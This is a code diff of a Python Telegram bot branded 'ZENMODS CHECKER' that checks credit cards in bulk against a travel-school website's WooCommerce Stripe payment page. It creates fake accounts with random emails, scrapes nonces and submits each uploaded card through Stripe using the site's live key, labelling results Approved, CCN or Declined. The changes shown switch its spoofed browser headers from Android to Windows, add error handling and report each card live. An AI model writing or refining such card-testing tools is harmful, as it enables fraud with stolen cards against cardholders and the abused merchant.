@@ -31,8 +31,6 @@ def by_anasxzer00(text):
         time.sleep(0.03)
     print()
 
-anasxzer00_best = ["requests", "bs4", "re", "json", "random", "string", "datetime"]
-
 def print_line():
     print_red(f"""|-|==========================================|-|""")
 
@@ -47,24 +45,6 @@ def print_magenta(text): print(f"\033[95m{text}\033[0m")
 def print_cyan(text): print(f"\033[96m{text}\033[0m")
 def print_white(text): print(f"\033[97m{text}\033[0m")
 def print_grey(text): print(f"\033[90m{text}\033[0m")
-def print_light_blue(text): print(f"\033[104m{text}\033[0m")
-def print_light_cyan(text): print(f"\033[106m{text}\033[0m")
-def print_light_grey(text): print(f"\033[47m{text}\033[0m")
-def print_light_magenta(text): print(f"\033[105m{text}\033[0m")
-def print_dark_blue(text): print(f"\033[34m{text}\033[0m")
-def print_dark_magenta(text): print(f"\033[35m{text}\033[0m")
-def print_dark_cyan(text): print(f"\033[36m{text}\033[0m")
-def print_dark_grey(text): print(f"\033[90m{text}\033[0m")
-def print_dark_green(text): print(f"\033[32m{text}\033[0m")
-def print_dark_yellow(text): print(f"\033[33m{text}\033[0m")
-def print_dark_red(text): print(f"\033[31m{text}\033[0m")
-def print_bright_blue(text): print(f"\033[94m{text}\033[0m")
-def print_bright_magenta(text): print(f"\033[95m{text}\033[0m")
-def print_bright_cyan(text): print(f"\033[96m{text}\033[0m")
-def print_bright_grey(text): print(f"\033[97m{text}\033[0m")
-def print_bright_green(text): print(f"\033[92m{text}\033[0m")
-def print_bright_yellow(text): print(f"\033[93m{text}\033[0m")
-def print_bright_red(text): print(f"\033[91m{text}\033[0m")
 
 def gggggggggggggggggg(length=9, domain=None):
     common_domains = ["gmail.com"]
@@ -80,10 +60,10 @@ def create_session():
         email = gggggggggggggggggg()
         headers = {
             'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
         html = response.text
@@ -93,13 +73,13 @@ def create_session():
         
         headers = {
             'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.thetravelinstitute.com',
             'referer': 'https://www.thetravelinstitute.com/register/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         data = [
             ('afurd_field_nonce', f'{nonce}'),
@@ -122,7 +102,7 @@ def create_session():
             ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
             ('wc_order_attribution_session_pages', '8'),
             ('wc_order_attribution_session_count', '1'),
-            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
+            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
             ('woocommerce-register-nonce', f'{noncee}'),
             ('_wp_http_referer', '/register/'),
             ('register', 'Register'),
@@ -169,7 +149,7 @@ def check_single_cc(cc_line, session):
         card = cc_line.replace('/', '|')
         lista = card.split("|")
         if len(lista) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Invalid format"
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Invalid format structure"
         
         cc = lista[0]
         mm = lista[1]
@@ -180,76 +160,91 @@ def check_single_cc(cc_line, session):
 
         headers = {
             'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
             'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         }
         response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
         html = response.text
-        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)
-        
-        headers = {
+        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
+        if not nonce_match:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Nonce extraction failed from account page"
+        nonce = nonce_match.group(1)
+
+        headers_stripe = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.thetravelinstitute.com',
             'referer': 'https://www.thetravelinstitute.com/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"android","browser":"chrome"}',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"win","browser":"chrome"}',
         }
-        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
+        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
         
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
-        res = response.text
-        iddd = ''
+        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
+        res = stripe_response.text
         
         if 'error' in res:
-            error = response.json()['error']['message']
+            try:
+                error = stripe_response.json()['error']['message']
+            except Exception:
+                error = "Unknown Stripe Tokenization Error"
+            
             if 'code' in error:
-                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
+                return f"ZENMODS CHECKER ⚡\nCCN ✅ (Approved Check)\n{card}\nReason: {error}"
             else:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
         else:
-            iddd = response.json()['id']
-            headers = {
+            try:
+                iddd = stripe_response.json()['id']
+            except Exception:
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Payment method ID extraction failed"
+
+            headers_confirm = {
                 'authority': 'www.thetravelinstitute.com',
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'origin': 'https://www.thetravelinstitute.com',
                 'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                 'x-requested-with': 'XMLHttpRequest',
             }
             params = {
                 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
             }
-            data = {
+            data_confirm = {
                 'action': 'create_and_confirm_setup_intent',
                 'wc-stripe-payment-method': iddd,
                 'wc-stripe-payment-type': 'card',
                 '_ajax_nonce': nonce,
             }
-            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
-            res_json = response.json()
-            if res_json['success'] == False:
-                error = res_json['data']['error']['message']
+            confirm_response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
+            
+            try:
+                res_json = confirm_response.json()
+            except Exception:
+                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Invalid confirmation server response"
+
+            if res_json.get('success') == False:
+                error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
                 if 'code' in error:
-                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
+                    return f"ZENMODS CHECKER ⚡\nCCN ✅ (Approved Check)\n{card}\nReason: {error}"
                 else:
-                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
+                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
             else:
-                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Approved!"
+                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nReason: Setup intent confirmed successfully!"
     except Exception as e:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: {str(e)}"
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Exception encountered -> {str(e)}"
 
 def process_bulk_file(chat_id, file_content):
     lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
@@ -259,8 +254,7 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    msg = bot.send_message(chat_id, f"⚡ **Zenmods Advanced Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Initializing sequential checking...")
-    msg_id = msg.message_id
+    bot.send_message(chat_id, f"⚡ **Zenmods Live Sequential Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Checking cards one by one with detailed feedback...")
 
     approved_count = 0
     ccn_count = 0
@@ -278,31 +272,21 @@ def process_bulk_file(chat_id, file_content):
         res = check_single_cc(card_line, session)
         detailed_results.append(res)
         
+        # প্রতিটা কার্ড চেক শেষে সাথে সাথে মেসেজ পাঠানো
+        bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
+
         if "Approved ✅" in res:
             approved_count += 1
-            zenmods_animation = (
-                "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
-                "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
-                f"{res}\n\n"
-                "🎇🎆🎇🎆🎇🎆🎇🎆"
-            )
-            bot.send_message(chat_id, zenmods_animation)
         elif "CCN ✅" in res:
             ccn_count += 1
-            bot.send_message(chat_id, res)
         elif "Declined ❌" in res:
             declined_count += 1
         else:
             error_count += 1
 
-        if index % 3 == 0 or index == total_cards:
-            progress_text = f"⚡ **Zenmods Advanced Engine** ⚡\nProgress: `[{index}/{total_cards}]` ({int((index/total_cards)*100)}%)\nProcessing cards sequentially..."
-            try:
-                bot.edit_message_text(progress_text, chat_id, msg_id)
-            except Exception:
-                pass
+        time.sleep(1)
 
-    report = f"📊 **ZENMODS ADVANCED CHECK REPORT** 📊\n\nTotal Checked: `{total_cards}`\nApproved ✅: `{approved_count}`\nCCN ✅: `{ccn_count}`\nDeclined ❌: `{declined_count}`\nErrors/Invalid: `{error_count}`\n\n🏁 Advanced checking completed successfully!"
+    report = f"📊 **ZENMODS FINAL CHECK REPORT** 📊\n\nTotal Checked: `{total_cards}`\nApproved ✅: `{approved_count}`\nCCN ✅: `{ccn_count}`\nDeclined ❌: `{declined_count}`\nErrors: `{error_count}`\n\n🏁 All checks completed!"
     bot.send_message(chat_id, report)
 
     file_bytes = io.BytesIO("\n\n".join(detailed_results).encode("utf-8"))
